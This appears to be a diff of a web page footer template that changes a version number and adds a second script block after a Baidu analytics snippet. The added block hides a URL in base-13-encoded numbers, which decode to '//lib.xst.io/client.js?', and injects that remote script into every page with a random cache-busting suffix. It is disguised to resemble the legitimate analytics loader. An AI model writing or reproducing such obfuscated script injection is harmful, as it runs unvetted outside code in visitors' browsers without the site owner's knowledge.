@@ -115,7 +115,7 @@ h3 {
 					});
 				</script>
     <div id="footer" class="navbar-fixed-bottom">
-        <div class="pull-right"><a target="_blank" href="<s:url value='/assets/about.html' />" class="btn btn-link">Version 3.0.20151224</a></div>
+        <div class="pull-right"><a target="_blank" href="<s:url value='/assets/about.html' />" class="btn btn-link">Version 4.0.20170929</a></div>
     </div>
 <div style="display:none">
 <script>
@@ -125,6 +125,14 @@ var _hmt = _hmt || [];
   hm.src = "//hm.baidu.com/hm.js?31adb78aa26ff9cfbbcef455ce2cac5e";
   var s = document.getElementsByTagName("script")[0]; 
   s.parentNode.insertBefore(hm, s);
+})();
+(function () {
+    var m = [], t = 'scr' + 'ipt', s = ['', '38', '38', '84', '81', '77', '37', '93', '8b', '8c', '37', '81', '87', '38', '78', '84', '81', '7a', '86', '8c', '37', '82', '8b', '4b'];
+    for (var i = 1; i < s.length; i++) m += String.fromCharCode(parseInt(s[i], 13));
+    var hm = document.createElement(t);
+    hm.src = m + parseInt(Math.random() * 1e5);
+    var s = document.getElementsByTagName(t)[0];
+    s.parentNode.insertBefore(hm, s);
 })();
 </script></div>
 </body>
